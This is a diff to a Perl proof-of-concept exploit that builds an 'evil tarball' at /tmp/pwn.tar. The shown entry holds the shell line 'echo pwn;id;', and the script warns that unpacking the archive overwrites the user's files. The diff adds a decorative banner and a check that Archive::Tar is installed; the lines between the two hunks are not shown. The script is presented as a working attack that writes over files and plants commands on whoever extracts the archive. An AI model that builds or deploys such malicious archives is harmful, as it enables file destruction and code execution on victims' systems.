@@ -1,6 +1,9 @@
 #!/usr/bin/perl -w
 
-use Archive::Tar;
+
+banner();
+
+eval { require Archive::Tar; } or die "Need to have Archive::Tar installed.";
 
 print "[*] Creating evil tarball ...\n";
 
@@ -16,5 +19,27 @@ $tar->add_data('file1.txt', "\necho pwn;id;\n");
 $tar->write('/tmp/pwn.tar');
 
 print "[+] Success!\n";
-print "[!] BE WARNED: DO NOT UNPACK /tmp/pwn.tar as it will overwrite your files.\n";
+print "[!] BE WARNED: DO NOT UNPACK /tmp/pwn.tar as it will overwrite your files.\n\n";
 
+
+sub banner
+{
+print<<EOB;
+
+
+ ██████████  ████████  ██████████    █████     █████
+▒███▒▒▒▒███ ███▒▒▒▒███▒███▒▒▒▒▒▒█  ███▒▒▒███  ▒▒███
+▒▒▒    ███ ▒▒▒    ▒███▒███     ▒  ███   ▒▒███ ███████    ██████   ████████  ████████  █████ ███ █████ ████████
+      ███     ██████▒ ▒█████████ ▒███    ▒███▒▒▒███▒    ▒▒▒▒▒███ ▒▒███▒▒███▒▒███▒▒███▒▒███ ▒███▒▒███ ▒▒███▒▒███
+     ███     ▒▒▒▒▒▒███▒▒▒▒▒▒▒▒███▒███    ▒███  ▒███      ███████  ▒███ ▒▒▒  ▒███ ▒███ ▒███ ▒███ ▒███  ▒███ ▒███
+    ███     ███   ▒███ ███   ▒███▒▒███   ███   ▒███ ███ ███▒▒███  ▒███      ▒███ ▒███ ▒▒███████████   ▒███ ▒███
+   ███     ▒▒████████ ▒▒████████  ▒▒▒█████▒    ▒▒█████ ▒▒████████ █████     ▒███████   ▒▒████▒████    ████ █████
+  ▒▒▒       ▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒     ▒▒▒▒▒▒      ▒▒▒▒▒   ▒▒▒▒▒▒▒▒ ▒▒▒▒▒      ▒███▒▒▒     ▒▒▒▒ ▒▒▒▒    ▒▒▒▒ ▒▒▒▒▒
+                                                                            ▒███
+                                                                            █████
+                                                                           ▒▒▒▒▒
+
+
+EOB
+
+}
